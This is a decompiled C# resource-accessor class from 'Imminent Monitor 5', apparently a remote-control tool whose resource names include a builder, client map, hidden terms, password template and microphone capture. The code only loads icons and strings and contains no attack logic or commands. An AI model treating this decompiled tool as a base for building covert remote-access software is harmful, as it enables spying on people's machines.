// Decompiled with JetBrains decompiler
// Type: Class145
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

[HideModuleName]
[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[StandardModule]
internal sealed class Class145
{
  private static ResourceManager resourceManager_0;
  private static CultureInfo cultureInfo_0;

  internal static ResourceManager smethod_0()
  {
    if (object.ReferenceEquals((object) Class145.resourceManager_0, (object) null))
      Class145.resourceManager_0 = new ResourceManager("ImminentMonitor.Resources", typeof (Class145).Assembly);
    return Class145.resourceManager_0;
  }

  internal static CultureInfo smethod_1() => Class145.cultureInfo_0;

  internal static void smethod_2(CultureInfo cultureInfo_1) => Class145.cultureInfo_0 = cultureInfo_1;

  internal static Bitmap smethod_3() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("1450695973_bullet-red", Class145.cultureInfo_0));

  internal static Bitmap smethod_4() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("1450695988_bullet-green", Class145.cultureInfo_0));

  internal static Bitmap smethod_5() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("42x42 normal", Class145.cultureInfo_0));

  internal static Bitmap smethod_6() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("application-dialog", Class145.cultureInfo_0));

  internal static Bitmap smethod_7() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("application-plus", Class145.cultureInfo_0));

  internal static Bitmap smethod_8() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("arrow", Class145.cultureInfo_0));

  internal static Bitmap smethod_9() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("arrow-circle-135-left", Class145.cultureInfo_0));

  internal static Bitmap smethod_10() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("battery-full", Class145.cultureInfo_0));

  internal static string smethod_11() => Class145.smethod_0().GetString("bug_report", Class145.cultureInfo_0);

  internal static string smethod_12() => Class145.smethod_0().GetString("builder", Class145.cultureInfo_0);

  internal static Bitmap smethod_13() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("card-address", Class145.cultureInfo_0));

  internal static Bitmap smethod_14() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("cards-bind-address", Class145.cultureInfo_0));

  internal static string smethod_15() => Class145.smethod_0().GetString("chatTemplate", Class145.cultureInfo_0);

  internal static string smethod_16() => Class145.smethod_0().GetString("client_map", Class145.cultureInfo_0);

  internal static string smethod_17() => Class145.smethod_0().GetString("clients", Class145.cultureInfo_0);

  internal static Bitmap smethod_18() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("computer", Class145.cultureInfo_0));

  internal static Bitmap smethod_19() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("computer--pencil", Class145.cultureInfo_0));

  internal static Bitmap smethod_20() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("control-power", Class145.cultureInfo_0));

  internal static Bitmap smethod_21() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("control-stop-square", Class145.cultureInfo_0));

  internal static Bitmap smethod_22() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("cross-button", Class145.cultureInfo_0));

  internal static Bitmap smethod_23() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("cross-shield", Class145.cultureInfo_0));

  internal static Bitmap smethod_24() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("database-network", Class145.cultureInfo_0));

  internal static Bitmap smethod_25() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("discs", Class145.cultureInfo_0));

  internal static Bitmap smethod_26() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder", Class145.cultureInfo_0));

  internal static Bitmap smethod_27() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder-import", Class145.cultureInfo_0));

  internal static Bitmap smethod_28() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder-open-document-music", Class145.cultureInfo_0));

  internal static Bitmap smethod_29() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder-open-image", Class145.cultureInfo_0));

  internal static Bitmap smethod_30() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder-open-slide", Class145.cultureInfo_0));

  internal static Bitmap smethod_31() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folder-sticky-note", Class145.cultureInfo_0));

  internal static Bitmap smethod_32() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("folders", Class145.cultureInfo_0));

  internal static byte[] smethod_33() => (byte[]) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("GifLib", Class145.cultureInfo_0));

  internal static Bitmap smethod_34() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("globe-network", Class145.cultureInfo_0));

  internal static Bitmap smethod_35() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("graphic-card", Class145.cultureInfo_0));

  internal static string smethod_36() => Class145.smethod_0().GetString("HiddenTos", Class145.cultureInfo_0);

  internal static string smethod_37() => Class145.smethod_0().GetString("ini", Class145.cultureInfo_0);

  internal static byte[] smethod_38() => (byte[]) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("Ionic_Zip", Class145.cultureInfo_0));

  internal static Bitmap smethod_39() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("logo", Class145.cultureInfo_0));

  internal static Bitmap smethod_40() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("map_marker", Class145.cultureInfo_0));

  internal static Bitmap smethod_41() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("map_marker_new", Class145.cultureInfo_0));

  internal static Bitmap smethod_42() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("marker", Class145.cultureInfo_0));

  internal static Bitmap smethod_43() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("marker--arrow", Class145.cultureInfo_0));

  internal static Bitmap smethod_44() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("memory", Class145.cultureInfo_0));

  internal static Bitmap smethod_45() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("microphone--arrow", Class145.cultureInfo_0));

  internal static Bitmap smethod_46() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("microphone--minus", Class145.cultureInfo_0));

  internal static Bitmap smethod_47() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("monitor", Class145.cultureInfo_0));

  internal static Bitmap smethod_48() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("monitor--arrow", Class145.cultureInfo_0));

  internal static Bitmap smethod_49() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("monitor-wallpaper", Class145.cultureInfo_0));

  internal static Bitmap smethod_50() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("mouse--arrow", Class145.cultureInfo_0));

  internal static Bitmap smethod_51() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("network-ethernet", Class145.cultureInfo_0));

  internal static Bitmap smethod_52() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("network-firewall", Class145.cultureInfo_0));

  internal static string smethod_53() => Class145.smethod_0().GetString("News", Class145.cultureInfo_0);

  internal static string smethod_54() => Class145.smethod_0().GetString("news1", Class145.cultureInfo_0);

  internal static string smethod_55() => Class145.smethod_0().GetString("on_connect", Class145.cultureInfo_0);

  internal static string smethod_56() => Class145.smethod_0().GetString("PasswordTemplate", Class145.cultureInfo_0);

  internal static string smethod_57() => Class145.smethod_0().GetString("plugins", Class145.cultureInfo_0);

  internal static Bitmap smethod_58() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("plus-button", Class145.cultureInfo_0));

  internal static Bitmap smethod_59() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("processor", Class145.cultureInfo_0));

  internal static string smethod_60() => Class145.smethod_0().GetString("proxies", Class145.cultureInfo_0);

  internal static Bitmap smethod_61() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("remote-control", Class145.cultureInfo_0));

  internal static Bitmap smethod_62() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("remote-desktop", Class145.cultureInfo_0));

  internal static string smethod_63() => Class145.smethod_0().GetString("saved_data", Class145.cultureInfo_0);

  internal static string smethod_64() => Class145.smethod_0().GetString("server_logs", Class145.cultureInfo_0);

  internal static Bitmap smethod_65() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("servers-network", Class145.cultureInfo_0));

  internal static string smethod_66() => Class145.smethod_0().GetString("settings", Class145.cultureInfo_0);

  internal static Bitmap smethod_67() => (Bitmap) RuntimeHelpers.GetObjectValue(Class145.smethod_0().GetObject("shield", Class145.cultureInfo_0));

  internal static string smethod_68() => Class145.smethod_0().GetString("specTemplate", Class145.cultureInfo_0);

  internal static string smethod_69() => Class145.smethod_0().GetString("thumbnails", Class145.cultureInfo_0);

  internal static string smethod_70() => Class145.smethod_0().GetString("UpdateFile", Class145.cultureInfo_0);
}
